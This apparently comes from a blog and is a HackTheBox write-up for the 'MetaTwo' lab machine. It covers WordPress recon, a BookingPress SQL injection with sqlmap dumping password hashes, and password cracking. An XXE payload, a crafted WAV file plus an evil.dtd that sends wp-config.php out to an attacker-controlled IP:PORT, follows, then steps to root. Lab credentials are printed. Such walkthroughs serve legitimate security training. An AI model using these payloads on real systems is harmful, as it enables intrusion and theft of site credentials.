+++ 
title = "MetaTwo HTB Write up"
description = "Write up for the HTB machine 'MetaTwo'"
author = "greatmoves"
tags = ["linux", "easy", "wpscan", "wordpress", "sqli", "sqlmap", "johntheripper", "gpg2john", "passpie", "ftp","hackthebox"]
date = 2023-02-26
+++
- [1. Initial recon](#1-initial-recon)
  - [1.1. nmap](#11-nmap)
  - [1.2. nikto](#12-nikto)
  - [1.3. website recon](#13-website-recon)
    - [1.3.1. wpscan](#131-wpscan)
- [2. user.txt](#2-usertxt)
  - [2.1. Exploiting WordPress](#21-exploiting-wordpress)
    - [2.1.1. BookingPress SQLi](#211-bookingpress-sqli)
      - [2.1.1.1. SQLmap](#2111-sqlmap)
      - [2.1.1.2. johntheripper](#2112-johntheripper)
    - [2.1.2. Authenticated XXE Within the Media Library](#212-authenticated-xxe-within-the-media-library)
- [3. root.txt](#3-roottxt)
  - [3.1. passpie](#31-passpie)
  - [3.2. gpg2john](#32-gpg2john)

# 1. Initial recon

## 1.1. nmap
`nmap -sC -sV 10.10.11.186`
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 1.2. nikto
`nikto -host 10.10.11.186`
```
+ Server: nginx/1.18.0
+ Root page / redirects to: http://metapress.htb/
```
## 1.3. website recon
We can see at the bottom of the page "Proudly powered by WordPress" so let's run wpscan

### 1.3.1. wpscan
`wpscan --url metapress.htb -e u,vp --api-token API_TOKEN --plugins-detection mixed`

```
...

[!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
 |     Fixed in: 5.6.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5

...

[i] Plugin(s) Identified:

[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2023-04-07T07:06:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | [!] The version is out of date, the latest version is 1.0.58
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
 |     Fixed in: 1.0.11
 |     References:
 |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

...

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 ...
 ```

# 2. user.txt

## 2.1. Exploiting WordPress

### 2.1.1. BookingPress SQLi

The first WordPress exploit is the SQL injection found in the plugin BookingPress.

Feel free to read the detailed proof of concept on [WPScan](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) for this vulnerability. From this PoC we can construct the following payload

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=070a17f10c&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080
```
by adding in the `-x http://127.0.0.1:8080` we are able to capture this request using BurpSuite Intercept. From BurpSuite we are able to save the request to a file `req.txt` so that it can be used with `sqlmap`

#### 2.1.1.1. SQLmap
First we'll use SQLmap to enumerate the databases: `sqlmap -r req.txt -p total_service --dbs`
```
available databases [2]:
[*] blog
[*] information_schema
```
next we'll use it to find the tables in those databases: `sqlmap -r req.txt -p total_service -D blog --tables`
```
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| ...                                  |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+
```
and finally the information in those tables: `sqlmap -r req.txt -p total_service -D blog -T wp_users --dump`
```
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```
Now we've got the hashes for the `admin` and `manager` passwords, so let's crack these.

#### 2.1.1.2. johntheripper
Let's place the two hashes into a file called `hash.txt`
```
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```
Then run johntheripper: `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

John is able to crack the manager's password hash as `partylikearockstar` so let's login at `http://metapress.htb/wp-admin/`

### 2.1.2. Authenticated XXE Within the Media Library

From our WPScan results we know there is another vulnerability within the media library. The detailed proof of concept for this vulnerability is available on [WPScan](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5) to read.

Following the process on [WPSec](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/) we will be able to construct our payloads.

Our `evil.dtd` will be
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://IP:PORT/?p=%file;'>" >
```
and we will use the following command to generate our `payload.wav`
```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://IP:PORT/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

We can use `python3 -m http.server` to host our `evil.dtd`

On the WordPress admin panel, navigate to the Media Library and upload your `payload.wav`, in the terminal where you have your http server running you will see some output. Decode this output using base64


The decoded output is the `wp-config.php` file that we specified in `evil.dtd`, in this file we will find credentials for the ftp server
```
/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
...
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
```
let's use the command `ftp metapress.htb@10.10.11.186` with the password.

in `/mailer/send_email.php` we can find some more credentails
```
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";   
```
now let's use these to ssh into the machine

`user.txt` can be found at `/home/jnelson`

# 3. root.txt

## 3.1. passpie

a simple `ls -la` in `/home/jnelson` reveals a `.passpie` directory. from there we can find `/home/jnelson/.passpie/.keys`

copy the PGP private key to a file on your system

```
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
...

V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P
o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

then we can use johntheripper again to crack this key

## 3.2. gpg2john

Using the command `gpg2john keys > pgphash`, where `keys` is the pgp private key, we can convert the key to a hash that johntheripper can crack.

for johntheripper to crack the pgphash we use the command `john pgphash --wordlist=/usr/share/wordlists/rockyou.txt` which reveals the passphrase to be `blink182`

back in the ssh terminal run the commands
```
touch pass
passpie export pass
Passphrase:blink182
cat pass
```
which will reveal the root password `p7qfAZt4_A1xo_0x`

simply use `su root` and enter the password for root!

`root.txt` can be found at `/root`